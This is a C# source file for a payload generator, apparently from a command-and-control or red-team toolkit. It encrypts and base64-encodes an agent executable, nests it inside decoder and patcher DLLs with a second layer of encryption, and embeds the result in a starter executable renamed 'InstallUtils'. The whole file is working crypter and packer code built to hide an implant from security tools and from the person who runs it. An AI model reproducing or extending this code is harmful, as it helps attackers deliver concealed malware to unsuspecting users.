using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Common.Payload;

public class PayloadGenerator
{
    public const string AgentSrcFile = "Agent.exe";
    public const string DecoderSrcFile = "DecoderDll.dll";
    public const string StarterSrcFile = "Starter.exe";
    public const string PatcherSrcFile = "PatcherDll.dll";

    public event EventHandler<string> MessageSent;

    public string SourceDir { get; private set; }

    public PayloadGenerator(string sourceDir)
    {
        this.SourceDir = sourceDir;
    }

    private string Source(string fileName)
    {
        return Path.Combine(SourceDir, fileName);
    }

    public byte[] GeneratePayload()
    {
        //Console.WriteLine("Generating encrypted Agent");

        this.MessageSent?.Invoke(this, $"Configuring Agent...");

        this.MessageSent?.Invoke(this, $"Encrypting Agent...");

        string srcAgent = this.Source(AgentSrcFile);
        var encAgent = this.Encrypt(srcAgent);
        var agentb64 = this.Encode(encAgent.Encrypted);


        this.MessageSent?.Invoke(this, $"Creating Decoder...");
        //Create DEcoder for agent
        var decDll = LoadAssembly(this.Source(DecoderSrcFile));
        decDll = AssemblyEditor.ReplaceRessources(decDll, new Dictionary<string, object>()
        {
            { "Payload", Encoding.UTF8.GetBytes(agentb64) },
            { "Key", encAgent.Secret }
        });


        this.MessageSent?.Invoke(this, $"Creating Patcher...");
        //Create Patcher
        var patchDll = LoadAssembly(this.Source(PatcherSrcFile));
        patchDll = AssemblyEditor.ReplaceRessources(patchDll, new Dictionary<string, object>()
        {
            { "Payload", decDll }
        });

        var encPatcher = this.Encrypt(patchDll);
        var patcherb64 = this.Encode(encPatcher.Encrypted);

        this.MessageSent?.Invoke(this, $"Started...");
        //Create Starter
        var starter = LoadAssembly(this.Source(StarterSrcFile));
        starter = AssemblyEditor.ReplaceRessources(starter, new Dictionary<string, object>()
        {
            { "Payload", Encoding.UTF8.GetBytes(patcherb64) },
            { "Key", encPatcher.Secret }
        });

        starter = AssemblyEditor.ChangeName(starter,"InstallUtils");

        return starter;
    }

    private byte[] LoadAssembly(string filePath)
    {
        return File.ReadAllBytes(filePath);
    }

    private EncryptResult Encrypt(string filePath)
    {
        var fileContent = File.ReadAllBytes(filePath);
        return this.Encrypt(fileContent);
    }

    private EncryptResult Encrypt(byte[] bytes)
    {
        return new Encrypter().Encrypt(bytes);
    }

    private string Encode(byte[] bytes)
    {
        return Convert.ToBase64String(bytes); ;
    }
}
